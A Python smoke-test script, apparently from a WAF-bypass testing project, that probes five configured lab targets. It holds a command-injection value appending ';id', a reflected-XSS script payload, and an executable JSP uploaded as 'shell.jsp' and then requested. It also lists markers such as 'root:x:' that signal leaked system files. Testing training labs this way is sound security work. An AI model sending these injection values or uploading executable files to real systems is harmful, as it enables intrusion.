"""对五个已配置检验靶场做连通性 + 回显冒烟测试。

用法： cd backend && python -m scripts.smoke_ranges  或  PYTHONPATH=src python scripts/smoke_ranges.py
"""
from __future__ import annotations

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import httpx
from dotenv import load_dotenv

from app.waf_testing import WafConfig, classify, ensure_low_security, login, same_origin
from app.verification_agent.adapters import _load_range_config

CONFIG_PATH = Path(__file__).resolve().parents[2] / "config" / ".env"

UA = {"User-Agent": "WAFByPasser-Smoke/1.0"}


def hline(title: str) -> None:
    print(f"\n{'=' * 70}\n{title}\n{'=' * 70}")


def check_dvwa(base_url: str, username: str, password: str, path: str, field: str, payload: str, label: str) -> None:
    print(f"[{label}] base={base_url} 账密={username}/{password}")
    client = httpx.Client(timeout=httpx.Timeout(20, connect=5), headers=UA, follow_redirects=False)
    try:
        config = WafConfig(base_url=base_url, username=username, password=password)
        login(client, config)
        ensure_low_security(client, config)
        url = same_origin(config, path)
        if field == "name":  # XSS GET
            resp = client.get(url, params={field: payload})
        else:  # cmdi POST
            resp = client.post(url, data={field: payload, "Submit": "Submit"})
        result, evidence = classify(resp, "")
        print(f"  HTTP {resp.status_code}  classify={result}")
        body = resp.text
        print(f"  回显前 400 字：{body[:400]!r}")
        # 常见命令回显 / XSS 反射标志
        markers = ["uid=", "root:x:", "www-data", "bin/", "alert(1)", "0</pre>"]
        hit = [m for m in markers if m in body]
        print(f"  命中标志：{hit if hit else '无'}")
    except Exception as exc:  # noqa: BLE001
        print(f"  失败：{exc}")
    finally:
        client.close()


def check_sqli(base_url: str) -> None:
    print(f"[SQL注入] base={base_url}")
    url = f"{base_url}/Less-1/?id=1"
    try:
        with httpx.Client(timeout=httpx.Timeout(20, connect=5), headers=UA, follow_redirects=False) as client:
            resp = client.get(url)
        result, evidence = classify(resp, "")
        print(f"  HTTP {resp.status_code}  classify={result}")
        print(f"  回显前 400 字：{resp.text[:400]!r}")
        print(f"  命中 'Your Login name'：{'Your Login name' in resp.text}")
    except Exception as exc:  # noqa: BLE001
        print(f"  失败：{exc}")


def check_log4j(base_url: str) -> None:
    print(f"[Log4j] base={base_url}")
    url = f"{base_url}/solr/admin/cores?action=STATUS"
    try:
        with httpx.Client(timeout=httpx.Timeout(20, connect=5), headers=UA, follow_redirects=False) as client:
            resp = client.get(url)
        result, evidence = classify(resp, "")
        print(f"  HTTP {resp.status_code}  classify={result}")
        print(f"  回显前 400 字：{resp.text[:400]!r}")
    except Exception as exc:  # noqa: BLE001
        print(f"  失败：{exc}")


def check_upload(base_url: str, field: str, filename: str) -> None:
    print(f"[文件上传] base={base_url} field={field} filename={filename}")
    # 随机后缀避免与历史上传同名；JSP 内容回显确定性标记，供访问闭环验证。
    import uuid

    marker = f"UPLOAD_OK_{uuid.uuid4().hex[:8]}"
    content = f"<% out.println(\"{marker}\"); %>"
    url = f"{base_url}/pass01.jsp"
    try:
        with httpx.Client(timeout=httpx.Timeout(20, connect=5), headers=UA, follow_redirects=False) as client:
            resp = client.post(
                url, files={field: (filename, content.encode("utf-8"), "application/octet-stream")}
            )
        result, evidence = classify(resp, "")
        print(f"  [上传] HTTP {resp.status_code}  classify={result}  命中'上传成功'={'上传成功' in resp.text}")

        # 访问上传后的文件，验证 JSP 是否真实执行并回显标记。
        access_url = f"{base_url}/uploads/{filename}"
        try:
            with httpx.Client(timeout=httpx.Timeout(20, connect=5), headers=UA, follow_redirects=False) as client:
                access = client.get(access_url)
            print(f"  [访问] {access_url}  HTTP {access.status_code}")
            print(f"        回显前 300 字：{access.text[:300]!r}")
            print(f"        命中标记 {marker}：{marker in access.text}")
        except Exception as exc:  # noqa: BLE001
            print(f"  [访问] 失败：{exc}")
    except Exception as exc:  # noqa: BLE001
        print(f"  [上传] 失败：{exc}")


def main() -> None:
    load_dotenv(CONFIG_PATH)
    hline("靶场冒烟测试")

    # 1. 命令注入 (DVWA)
    hline("1) 命令注入")
    cmdi_base, cmdi_user, cmdi_pass = _load_range_config(str(CONFIG_PATH), "RANGE_CMDI")
    check_dvwa(cmdi_base, cmdi_user, cmdi_pass, "/vulnerabilities/exec/", "ip",
               "-c 1 127.0.0.1;id", "命令注入")

    # 2. XSS (DVWA)
    hline("2) XSS")
    xss_base, xss_user, xss_pass = _load_range_config(str(CONFIG_PATH), "RANGE_XSS")
    check_dvwa(xss_base, xss_user, xss_pass, "/vulnerabilities/xss_r/", "name",
               "<script>alert(1)</script>", "XSS")

    # 3. SQL 注入
    hline("3) SQL 注入")
    check_sqli(os.getenv("RANGE_SQLI_BASE_URL", "").strip().rstrip("/"))

    # 4. Log4j
    hline("4) Log4j")
    check_log4j(os.getenv("RANGE_LOG4J_BASE_URL", "").strip().rstrip("/"))

    # 5. 文件上传
    hline("5) 文件上传")
    upload_base = os.getenv("RANGE_UPLOAD_BASE_URL", "").strip().rstrip("/")
    field = os.getenv("RANGE_UPLOAD_FILE_FIELD", "file")
    filename = os.getenv("RANGE_UPLOAD_FILENAME", "shell.jsp")
    check_upload(upload_base, field, filename)

    hline("完成")


if __name__ == "__main__":
    main()
